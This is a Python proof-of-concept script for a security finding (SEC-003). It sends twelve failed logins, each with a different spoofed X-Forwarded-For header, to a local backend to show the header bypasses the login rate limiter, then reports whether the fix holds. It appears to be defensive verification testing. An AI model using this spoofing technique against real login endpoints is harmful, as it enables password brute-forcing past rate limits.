"""
PoC for SEC-003 — DO NOT RUN against production.
============================================================
Demonstrates that pre-fix, X-Forwarded-For is attacker-controlled and
bypasses the login brute-force rate limiter (10/5min).  Each request
with a different XFF value gets a unique rate-limit key, so a single
attacker can fire unlimited login attempts.

Setup:
  1. Backend on http://127.0.0.1:9101 (or set POC_API_URL)
  2. login_limiter is freshly seeded (restart backend before running)

Test:
  Send 12 failed logins from same socket.  Each carries a different
  X-Forwarded-For header.

Expected:
  Pre-fix (rate_limit reads XFF):  12x HTTP 401 (each XFF is unique
                                    key, never hits 10/5min cap)
  Post-fix (rate_limit reads X-Real-IP, falls back to client.host):
                                    1-10x HTTP 401, 11-12x HTTP 429
                                    (all share key 127.0.0.1)

Cleanup: none — uses non-existent users so nothing is created.
"""
from __future__ import annotations

import json
import os
import sys
import urllib.error
import urllib.request

API = os.environ.get("POC_API_URL", "http://127.0.0.1:9101")


def attempt_login(idx: int):
    body = json.dumps({
        "username": f"poc-sec003-nonexistent-{idx}",
        "password": "WrongPass!",
    }).encode()
    req = urllib.request.Request(
        f"{API}/api/auth/login",
        data=body,
        headers={
            "Content-Type": "application/json",
            "X-Forwarded-For": f"192.0.2.{idx}",  # spoofed source per attempt
        },
        method="POST",
    )
    try:
        with urllib.request.urlopen(req, timeout=5) as resp:
            return resp.status, resp.read()[:60]
    except urllib.error.HTTPError as e:
        return e.code, e.read()[:60]


def main():
    print(f"PoC SEC-003 - X-Forwarded-For spoof bypassing login rate limit")
    print(f"API: {API}\n")

    results = []
    for i in range(1, 13):
        code, body = attempt_login(i)
        results.append(code)
        marker = "  (rate-limited)" if code == 429 else ""
        print(f"[{i:2d}] XFF=192.0.2.{i:<3d} -> HTTP {code}{marker}")

    print()
    n_429 = sum(1 for c in results if c == 429)
    n_401 = sum(1 for c in results if c == 401)
    print("=" * 70)
    if n_429 >= 1 and n_401 <= 10:
        print(f"[NO LEAK] {n_429} attempts got HTTP 429 (rate-limited)")
        print("  → backend rate-limited despite different XFF per request.")
        print("  → SEC-003 primary_remediation verified post-fix.")
        print("=" * 70)
        return 0
    elif n_429 == 0 and n_401 == 12:
        print(f"[LEAK CONFIRMED] all 12 attempts got HTTP 401 (no rate limit)")
        print("  → backend honoured spoofed X-Forwarded-For per request.")
        print("  → CWE-348 Use of Less Trusted Source.")
        print("=" * 70)
        return 1
    else:
        print(f"[INCONCLUSIVE] 401={n_401}, 429={n_429}")
        print("  → unexpected mix — re-run after backend restart")
        print("=" * 70)
        return 2


if __name__ == "__main__":
    sys.exit(main())
